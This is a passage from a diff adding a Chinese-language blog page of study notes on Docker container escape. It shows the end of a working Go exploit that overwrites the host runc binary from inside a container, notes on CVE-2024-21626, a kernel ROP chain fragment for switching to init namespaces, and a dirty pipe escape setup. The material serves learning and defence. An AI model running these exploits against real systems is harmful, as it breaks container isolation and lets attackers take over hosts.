+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
+</span></span><span style="display:flex;"><span>		fmt.<span style="color:#50fa7b">Println</span>(err)
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//然后将其覆盖为#!/proc/self/exe
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	fmt.<span style="color:#50fa7b">Fprintln</span>(fd, <span style="color:#f1fa8c">&#34;#!/proc/self/exe&#34;</span>)
+</span></span><span style="display:flex;"><span>	err = fd.<span style="color:#50fa7b">Close</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
+</span></span><span style="display:flex;"><span>		fmt.<span style="color:#50fa7b">Println</span>(err)
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	fmt.<span style="color:#50fa7b">Println</span>(<span style="color:#f1fa8c">&#34;[+] Overwritten /bin/sh successfully&#34;</span>)
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// 循环遍历/proc里的文件，直到找到runc是哪个进程
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> found <span style="color:#8be9fd">int</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> found <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> {
+</span></span><span style="display:flex;"><span>		pids, err <span style="color:#ff79c6">:=</span> ioutil.<span style="color:#50fa7b">ReadDir</span>(<span style="color:#f1fa8c">&#34;/proc&#34;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
+</span></span><span style="display:flex;"><span>			fmt.<span style="color:#50fa7b">Println</span>(err)
+</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> _, f <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> pids {
+</span></span><span style="display:flex;"><span>			fbytes, _ <span style="color:#ff79c6">:=</span> ioutil.<span style="color:#50fa7b">ReadFile</span>(<span style="color:#f1fa8c">&#34;/proc/&#34;</span> <span style="color:#ff79c6">+</span> f.<span style="color:#50fa7b">Name</span>() <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/cmdline&#34;</span>)
+</span></span><span style="display:flex;"><span>			fstring <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">string</span>(fbytes)
+</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(fstring, <span style="color:#f1fa8c">&#34;runc&#34;</span>) {
+</span></span><span style="display:flex;"><span>				fmt.<span style="color:#50fa7b">Println</span>(<span style="color:#f1fa8c">&#34;[+] Found the PID:&#34;</span>, f.<span style="color:#50fa7b">Name</span>())
+</span></span><span style="display:flex;"><span>				found, err = strconv.<span style="color:#50fa7b">Atoi</span>(f.<span style="color:#50fa7b">Name</span>())
+</span></span><span style="display:flex;"><span>				<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
+</span></span><span style="display:flex;"><span>					fmt.<span style="color:#50fa7b">Println</span>(err)
+</span></span><span style="display:flex;"><span>					<span style="color:#ff79c6">return</span>
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// 循环去读这个/proc/pid/exe，先拿到一个该文件的fd，该fd就指向了runc程序的位置
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> handleFd = <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> handleFd <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// Note, you do not need to use the O_PATH flag for the exploit to work.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		handle, _ <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">OpenFile</span>(<span style="color:#f1fa8c">&#34;/proc/&#34;</span><span style="color:#ff79c6">+</span>strconv.<span style="color:#50fa7b">Itoa</span>(found)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;/exe&#34;</span>, os.O_RDONLY, <span style="color:#bd93f9">0777</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">int</span>(handle.<span style="color:#50fa7b">Fd</span>()) &gt; <span style="color:#bd93f9">0</span> {
+</span></span><span style="display:flex;"><span>			handleFd = <span style="color:#8be9fd;font-style:italic">int</span>(handle.<span style="color:#50fa7b">Fd</span>())
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	fmt.<span style="color:#50fa7b">Println</span>(<span style="color:#f1fa8c">&#34;[+] Successfully got the file handle&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// 然后不断的去尝试写这个指向的文件，一开始由于runc会先占用着，写不进去，直到runc的占用解除了，就立即写入
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">for</span> {
+</span></span><span style="display:flex;"><span>		writeHandle, _ <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">OpenFile</span>(<span style="color:#f1fa8c">&#34;/proc/self/fd/&#34;</span><span style="color:#ff79c6">+</span>strconv.<span style="color:#50fa7b">Itoa</span>(handleFd), os.O_WRONLY|os.O_TRUNC, <span style="color:#bd93f9">0700</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">int</span>(writeHandle.<span style="color:#50fa7b">Fd</span>()) &gt; <span style="color:#bd93f9">0</span> {
+</span></span><span style="display:flex;"><span>			fmt.<span style="color:#50fa7b">Println</span>(<span style="color:#f1fa8c">&#34;[+] Successfully got write handle&#34;</span>, writeHandle)
+</span></span><span style="display:flex;"><span>			writeHandle.<span style="color:#50fa7b">Write</span>([]<span style="color:#8be9fd;font-style:italic">byte</span>(payload))
+</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>CVE-2024-21626：由于 <code>runc</code> 内部不正确处理文件描述符，导致泄漏关键的宿主机文件描述符到容器中。</p>
+<p>近日大火的CVE，在翻看<a href="https://bestwing.me/CVE-2024-21626-container-escape.html">这位师傅的文章</a>时看到的</p>
+<p><del>看起来很NB，虽然我现在看不懂😭</del></p>
+<h4 id="containerd">containerd</h4>
+<p>containerd 是一个工业级标准的容器运行时，它强调<strong>简单性</strong>、<strong>健壮性</strong>和<strong>可移植性</strong>，containerd 可以负责干下面这些事情：</p>
+<ul>
+<li>管理容器的生命周期（从创建容器到销毁容器）</li>
+<li>拉取/推送容器镜像</li>
+<li>存储管理（管理镜像及容器数据的存储）</li>
+<li>调用 runc 运行容器（与 runc 等容器运行时交互）</li>
+<li>管理容器网络接口及网络</li>
+</ul>
+<h3 id="内核漏洞">内核漏洞</h3>
+<h4 id="rop">ROP</h4>
+<p>commit_creds(prepare_kernel_cred(0))不会突破namespace对于进程的限制，也就是说即使在完成提权之后，task_struct中的fs_struct或者是ns_proxy都不受到影响还处于原本的命名空间中。</p>
+<p>可以看CVE-2021-22555的漏洞利用，在得到root权限后，需要在内核中将进程的命名空间切换为初始的全局命名空间 <code>init_nsproxy</code> 即可完成容器逃逸，执行<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> 即可替换掉当前进程的命名空间</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> POP_RDI_RET;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>; <span style="color:#6272a4">// RDI
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> FIND_TASK_BY_VPID;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> POP_RCX_RET;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4</span>; <span style="color:#6272a4">// RCX
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> CMP_RCX_4_JNE_POP_RBP_RET;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xDEADBEEF</span>; <span style="color:#6272a4">// RBP
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> POP_RSI_RET;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> INIT_NSPROXY; <span style="color:#6272a4">// RSI
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> SWITCH_TASK_NAMESPACES;
+</span></span></code></pre></div><h4 id="dirty-pipe">dirty pipe</h4>
+<p>通过利用 <code>CAP_DAC_READ_SEARCH</code> 与脏管道可以实现覆盖主机文件，实际上主要是<code>CAP_DAC_READ_SEARCH</code>可以调用<code>open_by_handle_at</code>, 可以获得主机文件的文件描述符，配合脏管道于是就可以修改主机文件。但是需要添加cap权限 <a href="https://github.com/greenhandatsjtu/CVE-2022-0847-Container-Escape">(3)</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run --rm -it --cap-add<span style="color:#ff79c6">=</span>CAP_DAC_READ_SEARCH ubuntu
+</span></span></code></pre></div><h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://wiki.teamssix.com/CloudNative/">云原生 | T Wiki (teamssix.com)</a></li>
+<li><a href="https://liuliuliuzy.github.io/tags/docker/">Docker</a></li>
+</ul>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/docker">Docker</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'ldrx30';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © ldrx30 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
